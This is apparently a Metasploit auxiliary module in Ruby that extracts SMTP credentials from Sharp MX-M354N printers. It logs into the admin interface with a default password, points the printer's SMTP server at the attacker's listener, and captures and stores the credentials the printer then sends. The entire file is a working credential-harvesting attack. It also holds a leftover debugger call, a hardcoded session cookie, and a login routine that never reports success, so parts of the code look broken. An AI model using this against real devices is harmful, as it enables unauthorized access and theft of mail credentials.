#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report
  

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Sharp MX-M354N SMTP credential extractor',
      'Description'    => %{
        This module extract the the printers SMTP user and password from Sharp MX-M354N. 
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", false]),
        OptString.new('PASSWORD', [true, "Password to access administrative interface. Defaults to admin", 'admin']),
        OptInt.new('RPORT', [ true, "The target port", 80]),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20]),
        OptInt.new('TCPDELAY', [true, 'Number of seconds the tcp server will wait before termination', 20])
      ], self.class)
  end


  def run_host(ip)
    print_status("Attempting to extract SMTP username and password for the host at #{rhost}")
    status = login
    binding.pry
    return unless status
    
    status = start_listener
    return unless status

    
    #Woot we got creds so lets save them.
    print_good( "Found the following creds were capured: #{$data}")
    loot_name     = "smtp.cp.creds"
    loot_type     = "text/plain"
    loot_filename = "smtp-creds.text"
    loot_desc     = "SMTP Pass-back Harvester"
    p = store_loot(loot_name, loot_type, datastore['RHOST'], $data , loot_filename, loot_desc)
    print_status("Credentials saved in: #{p.to_s}")
  end

  def login()
    login_page = "/login.html?/main.html"
    login_cookie = "Cookie: MFPSESSIONID=010094C7C1F9E3D535398729B30412E898F6F26BC52E1C468C94201405211505412340;"
    login_post_data = "ggt_select%2810009%29=3&ggt_textbox%2810003%29=#{datastore['PASSWORD']}&action=loginbtn&ggt_hidden%2810008%29=4"
    method = "POST"
    res = make_request(login_page,method,login_cookie,login_post_data)
    if res.blank? || res.code != 200
      print_error("Failed to login on #{rhost}. Please check the password for the Administrator account ")
      return false
    end
  end


  def trigger_smtp_request()
   	smtp_trigger_page = "/nw_quick.html"
  	smtp_trigger_post = "ggt_textbox%281%29=SC892865&ggt_textbox%282%29=Sharp-Printer&ggt_textbox%285%29=&ggt_textbox%286%29=#{datastore['LHOST']}&ggt_select%2825%29=0&ggt_textbox%2826%29=&ggt_textbox%2827%29=&action=executebtn&ggt_hidden%2830%29=389&ggt_hidden%2831%29=5&ggt_hidden%2832%29="
    smtp_trigger_cookie = "Cookie: MFPSESSIONID=010094C7C1F9E3D535398729B30412E898F6F26BC52E1C468C94201405211505412340;"
    method = "POST"
    print_status("Triggering SMTP reqeust")
    res = make_request(smtp_trigger_page,method,smtp_trigger_cookie, smtp_trigger_post)
	end	

  def start_listener
  	 server_timeout = datastore['TCPDELAY'].to_i
      begin
        print_status("Service running. Waiting for connection")
        	Timeout.timeout(server_timeout) do
        	exploit()
    	end
      rescue Timeout::Error
      # When the server stops due to our timeout, this is raised
      end
  end

  def primer
  		trigger_smtp_request()
  end

  def on_client_connect(client)
    on_client_data(client)
  end

  def on_client_data(client)
    $data = client.get_once
    client.stop
  end


  def make_request(page,method,cookie,post_data)
    begin   
      res = send_request_cgi(
      {
        'uri'       => page,
        'method'    => method,
        'Cookie'    => cookie,
        'data'      => post_data
      }, datastore['TIMEOUT'].to_i)
      return res
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{rhost}:#{rport} - Connection failed.")
      return false
    end
  end    
end